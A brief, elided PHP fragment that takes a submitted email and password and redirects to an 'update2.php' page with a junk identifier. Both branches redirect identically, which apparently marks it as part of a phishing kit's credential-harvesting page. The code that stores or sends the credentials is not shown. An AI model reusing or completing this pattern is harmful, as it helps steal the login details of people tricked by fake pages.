...
";
  ...
  if(isset($_POST['prevEmail']) && isset($_POST['password'])) {
    ...
    if($ret === false) {
     header("location:update2.php?email=$logn&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");
    }
    else {
    header("location:update2.php?email=$logn&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");
    }
